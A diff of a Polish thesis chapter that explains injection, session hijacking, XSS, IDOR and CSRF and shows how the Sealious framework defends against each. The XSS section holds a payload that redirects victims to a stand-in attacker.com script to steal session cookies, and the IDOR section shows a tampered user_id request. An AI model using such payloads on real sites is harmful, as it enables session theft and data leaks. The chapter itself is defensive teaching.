@@ -1,35 +1,22 @@
-# Odniesienie się do kwestii bezpieczeństwa i zależności pomiędzy dokumentami w Sealiousie
-
-W dzisiejszych czasach praktycznie co tydzień słyszy się w wiadomościach o wielkich wyciekach danych z mniej lub bardziej popularnych serwisów internetowych---dziury w bezpieczeństwie dostępu do danych odnajdywane są nawet w dużych serwisach, nad którymi pracują tysiące inżynierów i programistów. 
-
-Zdarza się, że aplikacje o bardzo dobrze zabezpieczonej strukturze IT są podatne na wyciek danych przez błąd programistyczny. W dobie systemów ciągłej integracji, wiecznie rosnącego poziomu skomplikowania aplikacji internetowych i średniego rozmiaru zespołów programistycznych nad nimi pracujących wzrasta prawdopodobieństwo przypadkowego spowodowania wycieku danych.
-
-Wyłaniają się dwie główne kategorie źródeł podatności aplikacji internetowej na wyciek danych:
-
-* **wadliwe zabezpieczenia struktury IT**---wykorzystywanie dziur w firewallach serwera, łamanie haseł do serwera głównego i inne techniki mogą dać włamywaczowi nieograniczony, bezpośredni dostęp do bazy danych.
-* **błąd w kodzie aplikacji internetowej**---przez nieuwagę programisty tworzącego daną aplikację zdarza się, że udostępnia użytkownikom dane, do których nie powinni mieć dostępu.
-
-W tej części pracy skupię się na drugiej kategorii: błędach programistów, które skutkują osłabieniem ochrony danych użytkowników---ponieważ są to problemy, którym framework programistyczny (w tym przypadku Sealious) jest w stanie zapobiec.  Omówię sposoby, w jakie Sealious tym problemom przeciwdziała lub będzie przeciwdziałał w przyszłych wersjach^[Należy mieć na uwadze, że Sealious jest frameworkiem do tworzenia nie tylko aplikacji internetowych---może być użyty również jako baza aplikacji *desktopowych*. Biorąc pod uwagę popularność aplikacji webowych w dzisiejszych czasach, opowiem głównie o problemach z bezpieczeństwem w Sieci.].
-
-## *Injection*
+# *Injection*
 
 *Injection* (ang. "wstrzyknięcie") to rodzaj ataku pozwalający atakującemu na wywołanie dowolnej kwerendy SQL (lub noSQL) na serwerze. Napisana przez atakującego kwerenda może usuwać ważne dane z bazy lub nadawać większe uprawnienia pewnym użytkownikom, co może doprowadzić do wycieku danych.
 
 Podatność na *injection* występuje bardzo często---zajmuje pozycję #1 na liście najpopularniejszych podatności aplikacji webowych [zob. @owasp_top_ten, p. 7]
 
 
-### Przykłady ataku typu *injection* w dużych aplikacjach
+## Przykłady ataku typu *injection* w dużych aplikacjach
 
 Mimo że o podatności na ataki typu *injection* traktuje bardzo wiele kursów o bezpieczeństwie aplikacji internetowych, to wciąż notorycznie słyszy się o poważnych w skutkach atakach osiągniętych przez wykorzystywanie właśnie tej dziury w zabezpieczeniach:
 
 * słynny atak LulzSec na sieć PlayStation Network---w wyniku którego atakujący zyskali pełen dostęp do bazy danych i kodu źródłowego serwisu [@lulz_sec_sony]
 * w 2009 roku pewien Amerykanin wykradł dane kart kredytowych 130 milionów obywateli za pomocą *SQL injection* [@130m_cards]
 
-### Przebieg ataku
+## Przebieg ataku
 
 Podstawą ataku typu *injection* jest umiejętne sformułowanie niewinnie wyglądającego zapytania na serwer (np. zapytanie `HTTP POST` odpowiedzialne za logowanie lub zakładanie użytkownika) tak, aby zostały wykonane dodatkowe kwerendy, napisane przez atakującego. 
 
-#### Przykład---SQL
+### Przykład---SQL
 
 Rozważmy kolejne kroki ataku na przykładzie prostego systemu logowania. W celu autoryzacji loginu i hasła użytkownika serwer musi wykonać zapytanie do bazy danych. Załóżmy, że zapytanie SQL jest formułowane w następujący sposób:
 
@@ -60,7 +47,7 @@ co sprawi, że w zmiennej `query` przechowywane będzie zapytanie w postaci:
 
 Takie zapytanie zamiast zwracać dane jednego użytkownika, zwraca całą zawartość tabeli `accounts`---co może doprowadzić do niepożądanego wycieku danych. 
 
-#### Przykład---NoSQL
+### Przykład---NoSQL
 
 Mimo że języki NoSQL projektowane były z myślą o zapobieganiu atakom typu *injection* [@nosql_prevents_injection], nieuważny programista NoSQL wciąż może sprawić, że jego aplikacja jest na nie podatna [zob. @nosql_injection].
 
@@ -113,7 +100,7 @@ to zapytanie przechowywane w zmiennej `db_query` ma postać:
 
 Takie zapytanie zwraca listę *wszystkich* postów z bazy---nastąpił wyciek danych. 
 
-### Zapobieganie
+## Zapobieganie
 
 Podatność na ataki typu *injection* jest łatwo wykryć w trakcie czytania kodu---dlatego warto dbać o to, aby każda linijka kodu odpowiedzialna za komunikację z bazą danych w aplikacji internetowej była przejrzana i zaakceptowana przez innego członka zespołu, niż jej autor. 
 
@@ -121,7 +108,7 @@ W przypadku SQL---warto korzystać z poleceń przygotowywanych (ang. *prepared s
 
 W przypadku noSQL w dużej mierze wystarczy pilnować, aby kwerenda zawsze była przechowywana w postaci hashmapy, a nie ciągu znaków---bo konkatenacja ciągów znaków umożliwia *injection*.
 
-### Jak Sealious zapobiega atakom typu *injection*
+## Jak Sealious zapobiega atakom typu *injection*
 
 Sealious reprezentuje wszystkie zapytania do bazy danych w postaci natywnego dla JavaScript obiektu (hashmapy), zgodnych ze specyfikacją interfejsu programistycznego MongoDB. Każde zapytanie MongoDB jest hashmapą---dlatego np. dla pól typu "`text`" każda wysłana przez użytkownika *wartość pola* jest wcześniej rzutowana na `String`. Takie podejście uniemożliwia zajście sytuacji opisanej powyżej. Takie rzutowanie na typ `String` możemy zaobserwować w poniższym fragmencie kodu^[kod pochodzi z pliku `lib/base-chips/field_type.text.js`, w kodzie źródłowym Sealiousa z wersji `0.6.21`]:
 
@@ -138,20 +125,20 @@ if (value_in_code instanceof Object) {
 Dodatkowo, Sealious jest napisany w taki sposób, że docelowy deweloper tworzący aplikację przy jego użyciu nie musi własnoręcznie formułować kwerend do bazy danych^[Sealious automatycznie buduje bogate w funkcjonalności API dla aplikacji klienckich, co znosi z barków dewelopera odpowiedzialność za pisanie kwerend do bazy danych]---co eliminuje ryzyko przypadkowego uczynienia tej aplikacji podatną na noSQL injection.
 
 
-## Błędy w uwierzytelnianiu i zarządzaniu sesją
+# Błędy w uwierzytelnianiu i zarządzaniu sesją
 
 W trakcie tworzenia aplikacji deweloperzy często ulegają pokusie stworzenia własnego procesu uwierzytelnianiu użytkownika. Nie jest to łatwe zadanie, dlatego potencjalnie taka aplikacja jest podatna na ataki, w których złośliwy agent podszywa się pod uprzywilejowanego użytkownika.
 
-### Przykłady błędów w procesie uwierzytelniania w dużych aplikacjach
+## Przykłady błędów w procesie uwierzytelniania w dużych aplikacjach
 
 Prawidłowe zaimplementowanie mechanizmu uwierzytelniania może sprawiać problem nawet dużym firmom, takim jak:
 
 * **LinkedIn** [@linkedin_breach]
 * **Yahoo** [@yahoo_breach]
 
-### Przebieg ataku
+## Przebieg ataku
 
-#### Ujawnienie id sesji
+### Ujawnienie id sesji
 
 Należy pamiętać, że id sesji jednoznacznie identyfikuje użytkownika i trzeba dbać o to, aby nie zostało ono ujawnione. Rozpatrzmy przebieg ataku na przykładzie hipotetycznej sieci społecznościowej.
 
@@ -171,15 +158,15 @@ Należy pamiętać, że id sesji jednoznacznie identyfikuje użytkownika i trzeb
  
 7. Użytkownik B jest zalogowany do sieci społecznościowej jako użytkownik A.
 
-#### Wyciek haseł
+### Wyciek haseł
  
 Osoba mająca fizyczny dostęp do bazy danych danej aplikacji (lub zdalny dostęp, za pomocą ataku typu *injection*) może wczytać zawartość tabeli przechowującej dane logowania użytkowników. 
 
 Jeżeli hasła te są przechowywane w postaci jawnego tekstu, atakujący może od razu użyć ich, aby zalogować się jako dowolny użytkownik z pozyskanej tabeli.
 
-### Zapobieganie
+## Zapobieganie
 
-#### Zapobieganie ujawnieniu id sesji
+### Zapobieganie ujawnieniu id sesji
 
 ID sesji powinno być traktowane jako sekret. Podjęcie następujących kroków zdecydowanie utrudnia atakującemu jego przechwycenie:
 
@@ -195,7 +182,7 @@ ID sesji powinno być traktowane jako sekret. Podjęcie następujących kroków 
     
 
 
-#### Zapobieganie wyciekaniu haseł
+### Zapobieganie wyciekaniu haseł
 
 Aby zapobiec wyciekom haseł, można przechowywać w bazie danych wartości pewnej funkcji hashującej dla każdego hasła, zamiast haseł w postaci jawnego tekstu. Wtedy przy próbie logowania wystarczy porównać wartość tej funkcji dla podanego przez użytkownika hasła z wartością przechowywaną w bazie.
 
@@ -209,9 +196,9 @@ Niestety jeżeli atakujący zyska dostęp do zahashowanych haseł, może użyć 
 
 Można się przed tym zabezpieczyć używając tzw. "solenia" (ang. *salting*). Proces ten polega na wstępnej modyfikacji tekstu przed obliczeniem dla niego wartości funkcji hashującej, co utrudnia wykorzystywanie *rainbow tables* do łamania haseł.
 
-### Zarządzanie sesją w Sealiousie[^channel_responsibility_footnote]
+## Zarządzanie sesją w Sealiousie[^channel_responsibility_footnote]
 
-#### Bezpieczeństwo identyfikatora sesji
+### Bezpieczeństwo identyfikatora sesji
 
 [^channel_responsibility_footnote]: Sealious w obecnych odsłonach (wersja `0.6.21-stable` i wersja `0.7-alpha`, stan ze stycznia 2016) nie zawiera mechanizmu sesji---aktualna struktura naszego frameworka wymaga, aby to chipy typu *channel* implementowały swój mechanizm weryfikacji identyfikatora sesji. Części tej sekcji odnoszące się do protokołów `http`(`s`) i plików *cookies* tyczą się konkretnego pluginu do Sealiousa---`sealious-www-server`.
 
@@ -262,7 +249,7 @@ if(request.payload.redirect_success){
 }
 ```
 
-#### Bezpieczeństwo haseł użytkowników
+### Bezpieczeństwo haseł użytkowników
 
 Pole `password` w zasobie typu `user` w Sealiousie jest obsługiwane przez `field_type.hashed_text`. Ten typ pola generuje hash hasła użytkownika używając zalecanego przez organizację *Internet Engineering Task Force* [zob. @pbkdf2_recommended] algorytmu `PBKDF2`^[zdecydowaliśmy się wybrać algorytm `PBKDF` z uwagi na jego odporność na kolizje---mając na uwadze, że jest on bardziej wymagający obliczeniowo niż proste hashowanie przy pomocy `md5`]:
 
@@ -291,11 +278,11 @@ encode: function(context, params, value_in_code){
 
 Zabezpiecza to hasła użytkowników przed złamaniem w wypadku wycieku informacji z bazy danych.
 
-## Cross-Site Scripting (XSS)
+# Cross-Site Scripting (XSS)
 
 Ataki typu XSS wykorzystują interpreter HTML przeglądarki do uruchamiania arbitralnych skryptów, które mają pełen dostęp do danych sesyjnych użytkownika i mogą spowodować ich wyciek. Zapobieganie im nie należy do najtrudniejszych, ale podatności na XSS są wciąż bardzo powszechne.
 
-### Przykłady ataków XSS w dużych aplikacjach
+## Przykłady ataków XSS w dużych aplikacjach
 
 Do stron, na których odnaleziono podatność na atak przy użyciu XSS, należą [wg @xssed]:
 
@@ -305,7 +292,7 @@ Do stron, na których odnaleziono podatność na atak przy użyciu XSS, należą
 * uk.playstation.com
 * 9gag.com
 
-### Przebieg ataku
+## Przebieg ataku
 
 Rozpatrzmy przebieg XSS na przykładzie webowego, opartego o AJAX^[Korzystanie z modelu AJAX w aplikacjach webowych często jest przyczyną podatności na XSS [@ajax_guide]---na szczęście często jesteśmy w stanie im w pełni zapobiec odpowiednio konfigurując wyłącznie backend aplikacji], interfejsu sieci społecznościowej. 
 
@@ -337,7 +324,7 @@ document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='
 
 aby każdy z użytkowników, któremu wyświetli się post atakującego został przekierowany na złośliwą stronę, która przechwytuje id sesji---co umożliwia atakującemu podszycie się pod tego użytkownika.
 
-### Jak Sealious zapobiega XSS
+## Jak Sealious zapobiega XSS
 
 Domyślnie zainstalowany w Sealiousie typ pola `text` korzysta z modułu `sanitize-html` aby usuwać z inputu użytkownika potencjalnie złośliwe skrypty^[poniższy fragment kodu pochodzi z pliku `lib/base-chips/field-type.text.js` z repozytorium sealious/sealious]: 
 
@@ -374,13 +361,13 @@ Jestem złośliwym użytkownikiem
 
 Tekst ten jest pozbawiony tagów `<script>` (wraz z ich zawartością), co uniemożliwia XSS. 
 
-## Insecure Direct Object Reference
+# Insecure Direct Object Reference
 
 *Insecure Direct Object Reference* (*"niezabezpieczone bezpośrednie odwołanie do obiektu"*) oznacza, że użytkownik może uzyskać dostęp do zasobu, który powinien być przed nim ukryty, podmieniając tylko identyfikator tego zasobu w `URL` lub w parametrze zdalnego wywołania metody serwera.
 
 Automatyczne testy nie mogą łatwo wykryć podatności tego typu, gdy aplikacja nie posiada deklaratywnego opisu tego, który użytkownik ma dostęp do jakiego zasobu^[bez takiego opisu wnioskowanie nt. uprawnień użytkowników do konkretnych zasobów może być dokonane tylko poprzez czytanie *imperatywnego* kodu aplikacji---co wymaga ludzkiej intuicji].
 
-### Przykład ataków typu *Insecure Direct Object Reference* w dużych aplikacjach
+## Przykład ataków typu *Insecure Direct Object Reference* w dużych aplikacjach
 
 
 Podatność na *Insecure Direct Object Reference* nie jest bardzo "medialna"^[14 tyś. wyników w Google Search dla zapytania "insecure direct object reference" vs 1,14 *mln*  dla zapytania "sql injection"], ale potrafi być dotkliwa w skutkach i mieć miejsce nawet w popularnych, dużych aplikacjach:
@@ -389,7 +376,7 @@ Podatność na *Insecure Direct Object Reference* nie jest bardzo "medialna"^[14
 * **Facebook**---z powodu podatności na *Insecure Direct Object Reference* atakujący mógł usunąć wszystkie notatki z konta dowolnego użytkownika tego serwisu [@facebook_idor].
 * **Twitter**---szczęśliwie w porę wykryta podatność na opisywany w tej sekcji atak umożliwiała atakującemu usunięcie danych kart płatniczych *wszystkich* reklamodawców Twittera [@twitter_idor]
 
-### Przebieg ataku z wykorzystaniem *Insecure Direct Object Reference*
+## Przebieg ataku z wykorzystaniem *Insecure Direct Object Reference*
 
 Odsłonięcie aplikacji na atak typu *Insecure Direct Object Reference* następuje, gdy udostępnia ona jakiś zasób pod URL-em, który zawiera identyfikator wczytywanego zasobu---ale nie weryfikuje, czy użytkownik, który wywołuje to zapytanie, ma dostęp do tego zasobu.
 
@@ -409,7 +396,7 @@ Atakujący musi tylko podmienić wartość parametru `user_id` w zapytaniu do se
 GET /app/confidentialUserInfo?user_id=nie_moje_id
 ```
 
-### Zapobieganie *Insecure Direct Object Reference*
+## Zapobieganie *Insecure Direct Object Reference*
 
 Istnieją dwa główne podejścia zapobiegania tego typu podatności na atak:
 
@@ -417,11 +404,15 @@ Istnieją dwa główne podejścia zapobiegania tego typu podatności na atak:
     
     Można zamiast bezpośrednich odwołań do zasobów korzystać z identyfikatorów obowiązujących tylko dla danej sesji/użytkownika. Przykładowo---do zaznaczania, który z 6-ciu dostępnych dla danego użytkownika zasobów został przez niego wybrany, zamiast używania identyfikatora zasobu z bazy danych jako parametru URL można używać liczb 1-6. Aplikacja musi wtedy mapować każdą z tych liczb na faktyczny identyfikator w bazie danych, osobno dla każdego użytkownika.
 
+    Ta metoda usuwa "Direct" z "Insecure Direct Object Reference".
+
 2. **Sprawdzanie praw dostępu przy każdym bezpośrednim odwołaniu do zasobu**
 
     Jeżeli aplikacja jest napisana tak, że przy *każdym* bezpośrednim odwołaniu sprawdza, czy użytkownik wykonujący zapytanie ma do danego zasobu prawo dostępu, to jest odporna na *Insecure Direct Object Reference*. Niestety w aplikacjach bogatych w różnorakie sposoby dostępu do danych trudno jest upewnić się, że żadne bezpośrednie odwołanie nie zostało pominięte. 
 
-### Jak Sealious zapobiega *Insecure Direct Object Reference*
+    Ta metoda usuwa "Insecure" z "Insecure Direct Object Reference".
+
+## Jak Sealious zapobiega *Insecure Direct Object Reference*
 
 Rozważając sposoby, w jakie Sealious może zapobiegać *Insecure Direct Object Reference* zdecydowaliśmy się wdrożyć podejście #2 z powyższej listy: *"Sprawdzanie praw dostępu przy **każdym** bezpośrednim odwołaniu do zasobu"*, co zaowocowało wzbogaceniem Sealiousa o następujące cechy:
 
@@ -549,11 +540,11 @@ Rozważając sposoby, w jakie Sealious może zapobiegać *Insecure Direct Object
 
 
 
-## Cross-Site Request Forgery (CSRF)
+# Cross-Site Request Forgery (CSRF)
 
 Ataki za pomocą CSRF są umożliwione przez fakt, że przeglądarka internetowa automatycznie dołącza zawartość pliku cookie zapisanego przez daną domenę do każdego zapytania HTTP(S) wysłanego na tę domenę. Atakujący może użyć tego faktu do wywoływania metod na serwerze podatnej aplikacji w imieniu użytkownika podlegającego atakowi.
 
-### Przykłady ataków typu CSRF w dużych aplikacjach
+## Przykłady ataków typu CSRF w dużych aplikacjach
 
 Podatności aplikacji na CSRF potrafią być dotkliwe w skutkach, i nawet deweloperom tworzącym oprogramowanie obsługujące instytucję finansową zdarza się nie zabezpieczyć ich aplikacji przed takimi atakami. Oto kilka przykładów aplikacji historycznie podatnych na CSRF [@csrf_examples]:
     
@@ -561,7 +552,7 @@ Podatności aplikacji na CSRF potrafią być dotkliwe w skutkach, i nawet dewelo
 * **YouTube**---przed załataniem dziury w bezpieczeństwie *większość* metod serwera nie była odporna na CSRF. Atakujący mógł m.in. zarządzać playlistami atakowanego użytkownika, oznaczać w jego imieniu filmy jako ulubione/polubione lub nawet dodawać/usuwać kanały z/do listy subskrybowanych.
 * **The New York Times**---podatność na CSRF sprawiła, że atakujący mógł poznać adres e-mail dowolnego użytkownika oraz wysyłać spam za pośrednictwem serwerów owego serwisu.
 
-### Przebieg ataku
+## Przebieg ataku
 
 Są dwa główne sposoby, w jakie można dokonać ataku z wykorzystaniem CSRF:
 
@@ -626,7 +617,7 @@ Są dwa główne sposoby, w jakie można dokonać ataku z wykorzystaniem CSRF:
     })
     ```
 
-### Zapobieganie CSRF
+## Zapobieganie CSRF
 
 Aby zapobiec atakom CSRF przy użyciu sposobu #1 z powyższej listy, wystarczy upewnić się, że wszystkie metody zmieniające stan aplikacji są udostępniane pod ścieżkami POST, a nie GET. Niestety to nie wystarczy, aby zabezpieczyć się przed atakami przy użyciu sposobu #2.
 
@@ -634,7 +625,7 @@ Jednym ze sposobów na to, aby w pełni uodpornić aplikację na CSRF jest wdro�
 
 Innym sposobem jest bardzo staranne upewnianie się, że użytkownik faktycznie chciał wykonać operację reprezentowaną przez daną ścieżkę. Można to osiągnąć np. poprzez system CAPTCHA lub kody SMS.
 
-### Jak Sealious zapobiega CSRF
+## Jak Sealious zapobiega CSRF
 
 W obecnej najnowszej wersji (`0.7-alpha`) Sealious^[Bardziej konkretnie: plugin `sealious-channel-rest` do Sealiousa] zapobiega tylko CSRF dokonywanym za pomocą sposobu #1---poprzez nieudostępnianie metod modyfikujących stan aplikacji pod ścieżkami GET.
 
@@ -645,8 +636,14 @@ Planujemy, aby w wersji `0.7-stable` Sealious w pełni zabezpieczał napisane w 
 
 [^yes_you_read_that_right]: Może się wydawać, że przechowywanie owego dodatkowego tokenu autoryzacji w pliku cookie niweczy nasze zamiary--przecież sednem ataku CSRF jest fakt, że id sesji trzymane w cookie jest zawsze dopisywane przez przeglądarkę do zapytań HTTP wysłanych na serwer naszej aplikacji. Jak dodanie drugiego tokenu do pliku cookies ma nas obronić przed tym atakiem? Otóż serwer w trakcie sprawdzania obecności tokenu w zapytaniu nie będzie go szukał w nagłówkach `Cookie`---będzie oczekiwał obecności nagłówka `csrfToken`, niezależnego od `Cookie`, i to jego wartość będzie porównywał z tokenem przechowywanym w zmiennej sesyjnej. Brak tego nagłówka lub zła jego wartość będą się wiązać z odmową dostępu. W przeglądarce internetowej tylko skrypt pochodzący z danej domeny ma dostęp do jej pliku cookie na komputerze użytkownika, więc tylko taki skrypt jest w stanie dopisać ten token do *nagłówka* HTTP, co skutecznie zapobiega CSRF.
 
-## Podsumowanie
+# Podsumowanie {-}
 
 Aplikacje pisane w Sealiousie są domyślnie chronione przed wieloma typami ataków mogących skutkować ujawnieniem poufnych danych lub wykonaniem nieautoryzowanych operacji. Deweloper tworzący aplikację sealiousową nie musi poświęcać zbyt dużo uwagi jej bezpieczeństwu---Sealious robi to za niego. 
+
+# Załączniki {-}
+
+### Załącznik 1
+#### Kod źródłowy frameworka Sealious
+dostępny pod adresem http://github.com/sealious/sealious
 
 # Bibliografia
